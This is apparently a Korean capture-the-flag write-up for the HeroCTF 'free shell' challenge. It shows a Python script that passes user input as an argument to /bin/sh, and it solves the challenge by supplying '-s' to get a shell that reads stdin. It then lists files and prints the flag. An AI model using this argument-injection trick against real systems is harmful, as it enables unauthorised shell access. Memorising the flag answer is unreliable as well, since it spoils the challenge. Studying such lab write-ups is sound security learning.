# Description
원격 서버의 쉘을 얻어 내야 한다. 
로컬에서 솔루션을 얻은 후
nc misc.heroctf.fr 7000에서 테스트할 수 있다. 

flag 형식 : Hero{flag}
Author : xanhacks
# files
```
#!/usr/bin/env python3
import os
import subprocess


print("Welcome to the free shell service!")
print("Your goal is to obtain a shell.")

command = [
    "/bin/sh",
    input("Choose param: "),
    os.urandom(32).hex(),
    os.urandom(32).hex(),
    os.urandom(32).hex()
]
subprocess.run(command)
```
# 문제 분석
문제에 주어진 파이썬 파일을 보면 subprocess.run을 통해 command에 들어있는 내용들을 시스템에서 실행하는 걸 알 수 있다. command에서 input 값을 얻어내기 때문에 이를 통해 문제 해결하는 방법을 찾아야 한다. os.urandom(32).hex()를 실행하고 끝내기 전에 input 라인에서 쉘을 얻어야 하는 것.

# 문제 풀이
```
Welcome to the free shell service!
Your goal is to obtain a shell.
Choose param: -s
ls
entrypoint.sh
flag_5MZlXDu0VEMNaXTQsiDqzpaPm5r5xm1d.txt
free_shell.py
cat flag_*
Hero{533m5_11k3_y0u_f0und_7h3_c0223c7_p424m3732}
```
# 알아야 하는 것
> linux command를 standard input으로 받아오도록 하는 command flag = **-s**
> https://man7.org/linux/man-pages/man1/sh.1p.html